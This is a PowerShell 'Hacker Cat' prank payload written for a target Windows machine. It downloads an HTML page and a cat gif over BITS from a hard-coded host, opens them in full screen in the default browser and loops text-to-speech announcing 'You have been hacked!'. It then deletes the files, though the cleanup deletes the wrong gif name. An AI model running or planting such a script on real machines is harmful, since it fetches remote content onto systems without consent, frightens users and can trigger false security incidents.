# Hacker Cat full screen
# Just a dumb script to bring Hacker Cat full screen with whichever Internet Browser is set as the Default.

# ******************************************************************
# ******************************************************************
# **                                                              **
# **                         Hacker Cat                           **
# **                    Written by: Z3R0th                        **
# **                                                              **
# **                                                              **
# ******************************************************************
# ******************************************************************

# Credit to Beefycode for the code for text to speech!
# Will Create a full screen of "Hackercat"

$Destination = "~/documents"

$Cats = 'meow.gif', 'mrow.gif', 'rage.gif', 'cat.gif'

$Selection = $Cats[ (Get-Random -Maximum ([array]$Cats).count)]

Function Invoke-Hackercat
{
    Add-type -AssemblyName System.Windows.Forms
#    Start-process "http://giphy.com/gifs/cat-hacker-webs-o0vwzuFwCGAFO/fullscreen" -WindowStyle Maximized #This will just grab the gif from Giphy.
    Start-BitsTransfer -Source "http://10.33.6.1:8080/hax.html" -Destination "$Destination/hax.html" #This will download hax.html to the target to be ran locally.
    Start-BitsTransfer -Source "http://10.33.6.1:8080/$Selection" -Destination "$Destination/meow.gif" #This will download meow.gif to the target to be ran locally.
    start-process "$Destination/hax.html" -WindowStyle Maximized #This will start the process for hax.html to induce hackercat in whichever the default internet browser is.
    Start-sleep 1 
    [System.Windows.Forms.SendKeys]::SendWait("{F11}") #After waiting, will hit F11 which will fullscreen the browser.

    $voice = New-Object -ComObject SAPI.SPVoice
    $voice.Rate = 0
# Will create a PowerShell function for Text to Speech
    function invoke-speech
 {
      param([Parameter(ValueFromPipeline=$true)][string] $say )

      process
      {
         $voice.Speak($say) | out-null;
     }
 }
 # Make Windows Text to Speech say whatever you want for a loop of whatever you want to change the value to. 
 new-alias -name out-voice -value invoke-speech;
 start-sleep 2
 for ($i=1; $i -le 10; $i++ ) {
    "You have been hacked! Please call your I A M!" | out-voice #Change this to whatever you want
    "Hacker Cat Strikes Again!!!!!" | out-voice #Change this to whatever you want
    }

}

Invoke-Hackercat 
if (Test-Path "$Destination/hax.html") { rm $Destination/hax.html; Write-Host "Deleted hax.html" } else { Write-Host "Unable to delete file :c" } #Will look for files to cleanup
if (Test-Path "$Destination/meow.gif") { rm $Destination/$Selection; Write-Host "Deleted $Selection" } else { Write-Host "Unable to delete file :c" } #Will look for files to cleanup
Write-Host "Hackercat has finished!"
